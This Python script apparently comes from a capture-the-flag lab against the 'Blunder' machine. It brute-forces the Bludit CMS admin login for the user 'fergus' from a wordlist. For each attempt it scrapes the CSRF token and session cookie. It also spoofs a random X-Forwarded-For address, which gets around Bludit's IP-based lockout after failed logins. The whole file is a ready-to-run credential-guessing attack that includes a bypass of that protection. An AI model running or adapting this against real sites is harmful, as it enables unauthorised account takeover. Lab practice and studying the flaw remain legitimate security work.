import requests
import re
import random

HOST = '10.129.80.58'
USER = 'fergus'
PROXY = {'http':'http://127.0.0.1:8080'}

def init_session():
    # Return CSRF + Session (cookie)
    r = requests.get(f'http://{HOST}/admin/')
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
    csrf = csrf.group(1)
    cookie = r.cookies.get('BLUDIT-KEY')
    return csrf, cookie


def login(user, password):
    csrf,cookie = init_session()
    headers = {'X-FORWARDED-FOR': f'{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}'}
    data = {
	    'tokenCSRF':csrf,
	    'username':user,
	    'password':password,
	    'save':'' }
    cookies = {'BLUDIT-KEY':cookie}
    # r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, proxies=PROXY)
    r = requests.post(f'http://{HOST}/admin/login', data=data, headers=headers, cookies=cookies, allow_redirects=False)
    if r.status_code != 200:
        print(f"CSRF Error...{USER}:{password}")
    elif 'password incorrect' in r.text:
        print('password incorrect')
        return False
    elif 'has been blocked' in r.text:
        print("BLOCKED")
        return False
    else:
        print(f'{USER}:{password}')


wl = open('blunder-wordlist.txt').readlines()
for line in wl:
    line = line.strip()
    login('fergus', line)
